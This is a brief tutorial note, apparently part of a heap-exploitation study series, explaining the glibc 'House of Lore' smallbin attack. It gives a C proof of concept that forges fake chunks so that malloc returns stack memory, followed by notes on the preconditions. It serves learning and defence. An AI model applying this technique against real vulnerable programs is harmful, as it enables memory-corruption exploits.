# House of Lore
> LongChampion, 18/03/2020

This attack ideal is similar to *fastbin_dup_into_stack*, but it is used for smallbin.
```
#include <stdlib.h>

struct Chunk
{
    long long pre_size, size;
    struct Chunk *fd, *bk;
};

int main()
{
    void *Victim = malloc(0x100 - 8);
    void *Barier = malloc(0x100 - 8);
    struct Chunk Fake, NextFake;

    free(Victim);
    struct Chunk *Real = (struct Chunk *) (Victim - 0x10);

    void *Large = malloc(0x200 - 8);

    Real->bk = &Fake;
    Fake.fd = Real;
    Fake.bk = &NextFake;
    NextFake.fd = &Fake;

    Victim = malloc(0x100 - 8);
    void *STACK = malloc(0x100 - 8);
}
```
There are some note:
- Chunk `Barier` is used to prevent `Victim` from becoming the top_chunk (which we can't free)
- After be freed, `Victim` is located in unsorted_bin, so we call `malloc` with request size larger than size of `Victim` to push `Victim` into smallbin.
- **All modify at `Victim` must happen after we pushed it into smallbin.**
- Chunk `Fake` and chunk `NextFake` can be located anywhere, it doens't need to be adjacent or have real size same as `Victim`, but their address should be aligned as well.
- `STACK` will point to `Fake.fd`, not `Fake`.
- This attack it NOT work against largebin because of size checking.
